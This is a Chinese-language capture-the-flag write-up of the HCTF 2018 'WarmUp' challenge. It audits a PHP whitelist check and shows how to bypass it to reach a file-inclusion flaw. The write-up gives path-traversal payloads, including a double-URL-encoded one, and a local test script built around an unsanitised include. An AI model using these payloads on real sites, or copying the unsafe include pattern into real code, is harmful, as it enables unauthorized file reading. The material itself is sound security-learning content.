# [HCTF 2018]WarmUp


# [HCTF 2018]WarmUp

初次访问，这个滑稽应该是代表了作者幸灾乐祸的表情

![[HCTF 2018]WarmUp-1](https://pic.imgdb.cn/item/6533c62ec458853aef75af20.jpg)

一开始以为flag隐写在图片里，下载图片后查看里面的内容没有找到flag

查看网页源代码

![[HCTF 2018]WarmUp-2](https://pic.imgdb.cn/item/6533c6b6c458853aef77d68e.jpg)

得到提示：`<!--source.php-->`，访问`source.php`

![[HCTF 2018]WarmUp-3](https://pic.imgdb.cn/item/6533c6fcc458853aef78ed46.jpg)

代码审计

```php
 <?php
    highlight_file(__FILE__);  // 高亮显示当前文件的源代码
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

初步审计，看到代码里出现了个`hint.php`，先访问看看

![[HCTF 2018]WarmUp-4](https://pic.imgdb.cn/item/6533ca51c458853aef86d437.jpg)

告知flag在`ffffllllaaaagggg`，也就是要想办法看到`ffffllllaaaagggg`里的内容

先看看`emmm类`外的代码

```php
if (! empty($_REQUEST['file'])	//'file'参数的值不为空
        && is_string($_REQUEST['file'])	//'file'参数的值为字符串
        && emmm::checkFile($_REQUEST['file'])	//将'file'参数的值传入emmm类的checkFile方法后返回真
    ) {
    // 如果上述条件都满足，则执行以下代码块
        include $_REQUEST['file'];	// 包含'file'参数的值所指向的文件
        exit;
    } else {
    // 如果上述条件不满足，执行以下代码块
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
```

**这题应该是想让我们用文件包含代码`include $_REQUEST['file']`去查看`ffffllllaaaagggg`里的内容**

假设`ffffllllaaaagggg`文件和`source.php`在相同目录下，构造payload：`?file=ffffllllaaaagggg`就可以包含到`ffffllllaaaagggg`文件

假设`ffffllllaaaagggg`文件在`source.php`所在的目录的父级目录(当前目录的上一级目录)下，则构造payload：`?file=../ffffllllaaaagggg`就可以包含到`ffffllllaaaagggg`文件

但是想要让代码执行到`include $_REQUEST['file']`，得满足`if`条件判断：

- `'file'`参数的值不为空 (满足√)
- `'file'`参数的值为字符串 (满足√)
- 将`'file'`参数的值传入`emmm类`的`checkFile`函数后返回真 (暂且未知？)

所以接下来的重点是审计`emmm类`的`checkFile`函数:

```php
public static function checkFile(&$page)  //将$_REQUEST['file']接收到的值传给$page
{
    $whitelist = ["source"=>"source.php","hint"=>"hint.php"];	//创建$whitelist（白名单）数组
    if (! isset($page) || !is_string($page)) {
        echo "you can't see it";
        return false;	//如果$page变量不存在或$page变量的值不是字符串则返回false
    }

    if (in_array($page, $whitelist)) {	
        return true;	//如果$page变量的值在$whitelist（白名单）数组中则返回true
    }

    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );	
    /*
    $page . '?''：给$page变量的值后面加个'?'
    
    mb_strpos($page . '?', '?')：输出$page . '?'这个字符串首次出现'?'的位置(输出一个数字)
    之所以在$page变量的值后面加个'?'，是因为mb_strpos()方法若是找不到首次出现'?'的位置会输出false
    
    mb_substr($page,0,mb_strpos($page . '?', '?'))：
    将$page变量的值(字符串)从首字符(第0)开始截取mb_strpos($page . '?', '?')个字符
    换言之就是把$page中第一个'?'后面的字符串都去掉，只留下第一个'?'前的字符串
    
    将截取后的值赋给$_page变量
    */
    if (in_array($_page, $whitelist)) {
        return true;
    }	//如果$_page变量的值在$whitelist（白名单）数组中则返回true

    $_page = urldecode($page);	//将$page变量的值通过URL解码后赋给$_page变量
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );//与上一个类似，就是截取URL解码后的$page变量的值的第一个'?'前的字符串
    if (in_array($_page, $whitelist)) {
        return true;	//如果$_page变量的值在$whitelist（白名单）数组中则返回true
    }
    echo "you can't see it";
    return false;
}
```

>  以上代码中出现的函数名：
>
> - [isset() 函数](https://www.runoob.com/php/php-isset-function.html)
> - [is_string函数](https://www.runoob.com/php/php-is_string-function.html)
> - [in_array函数](https://www.runoob.com/php/func-array-in-array.html)
> - [mb_substr() 函数](https://www.runoob.com/php/func-string-mb_substr.html)
> - [mb_strpos()函数](https://www.php.net/manual/zh/function.mb-strpos.php)

通过审计可以得知，`checkFile`函数里有三个地方可以返回true

若是要通过第一个地方来返回true，通过URL传进来的`file`参数的值只能为`source.php`或者`hint.php`

即：`source.php?file=hint.php`或`source.php?file=hint.php`，后面是不能跟其他的东西的，很显然是不可以通过第一个地方来返回true，毕竟我们是要去访问`ffffllllaaaagggg`文件

若是要通过第二个地方来返回true，通过URL传进来的`file`参数的值的格式必须为：`source.php?xxxx`或者`hint.php?xxxx`

当`$page`变量的值为`source.php?xxxx`或者`hint.php?xxxx`，代码会执行到：

```php
    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }
```

截取`$page`变量的值的第一个`?`前的字符串给`$_page`变量，`$_page`变量的值为`source.php`或者`hint.php`，在白名单内，返回true

所以payload为：

- `?file=source.php?/../ffffllllaaaagggg`
- `?file=source.php?/../../ffffllllaaaagggg`
- `?file=source.php?/../../../ffffllllaaaagggg`
- ……

(把`source.php`替换成`hint.php`也可以)

在绕过白名单的情况下不断尝试往上级目录包含`ffffllllaaaagggg`文件

**最终确定payload为：`http://09b122ae-c857-4cde-b0c1-0619a97418a6.node4.buuoj.cn:81/source.php?file=source.php?/../../../../ffffllllaaaagggg`**

> 可能会有疑惑：在路径前加个`source.php?`难道不会出错吗？
>
> 服务器会把`source.php?`看作是与**当前页面处于同级目录下的一个叫做"source.php?"的目录**，如果路径就单单是这个目录，因为目录不存在，就会无法确定而出错。
>
> 如果路径是`source.php?/..`：相当于是当前目录下的一个"source.php?"目录下的上级目录，尽管"source.php?"目录不存在，但`source.php?/..`一定就是当前目录了嘛(有点绕)
>
> 所以`source.php?/../../../../ffffllllaaaagggg`和`../../../ffffllllaaaagggg`的效果是一样的
>
> **对此我特意做了个实验来验证，放在本文的最下方**

当然，也可以从第三处入手来返回true，总的思路差不多

与第二处相比，第三处就多了条代码：`$_page = urldecode($page)`，也就是会先把`$page`的值通过URL解码后再截取第一个`?`前的字符串到白名单里比较

```php
$_page = urldecode($page);
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }
```

**因为使用超全局变量`$_REQUEST`已经被解码了**，所以要先把payload通过URL编码两次

**最终确定payload为：`http://09b122ae-c857-4cde-b0c1-0619a97418a6.node4.buuoj.cn:81/source.php?file=source.php%253F/../../../../ffffllllaaaagggg`**

(也可以把`/`编码一次，但不可以编码两次)

> [urldecode()函数](https://www.php.net/manual/zh/function.urldecode.php)
>
> 有的人可能有疑惑：为什么不把后面的`/`也编码编码两次？
>
> 全都编码两次的结果是：`source.php%253F%252F..%252F..%252F..%252F..%252Fffffllllaaaagggg`
>
> 执行`emmm::checkFile($_REQUEST['file'])`的`$_REQUEST['file']`接收参数时自动解码一次：`source.php%3F%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg`
>
> 执行`$_page = urldecode($page)`时再解码一次：`source.php?/../../../../ffffllllaaaagggg`
>
> 这时返回true，开始执行`include $_REQUEST['file']`，但是执行`include $_REQUEST['file']`的`$_REQUEST['file']`接收到的参数是只解码过一次的：`source.php%3F%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg`，服务器会把它直接当作一个文件名

​	

**验证实验：**

- 服务器：CentOS 7

首先在网站的根目录`/www/admin/localhost_80/wwwroot`下有创建一个`index.php`作为网站首页，`wwwroot`目录下只有以下内容：

```bash
[root@wzh wwwroot]# ls
error  index.php
```

`index.php`里的内容：

```php
<?php
 include $_REQUEST['file'];
```

接着在`/www/admin`下创建一个`flag.php`

```php
<?php
echo "flag";
```

以上可知`flag.php`在`index.php`的上上级目录下，正常用`?file=../../flag.php`可以包含到`flag.php`

![[HCTF 2018]WarmUp-5](https://pic.imgdb.cn/item/65348581c458853aef96880c.jpg)

用`?file=xxx/../../../flag.php`同样也可以包含到`flag.php`

![[HCTF 2018]WarmUp-6](https://pic.imgdb.cn/item/65348625c458853aef9876db.jpg)

由此可知，尽管"xxx"是不存在的，但服务器仍会把"xxx"当作是一个目录，`xxx/..`的意思是"xxx"目录的上级目录，相当于就是当前目录，所以`xxx/../../../flag.php`和`../../flag.php`是相同路径

​	

​	

**参考文章**

- [isset() 函数](https://www.runoob.com/php/php-isset-function.html)
- [is_string函数](https://www.runoob.com/php/php-is_string-function.html)
- [in_array函数](https://www.runoob.com/php/func-array-in-array.html)
- [mb_substr() 函数](https://www.runoob.com/php/func-string-mb_substr.html)
- [mb_strpos()函数](https://www.php.net/manual/zh/function.mb-strpos.php)
- [urldecode()函数](https://www.php.net/manual/zh/function.urldecode.php)

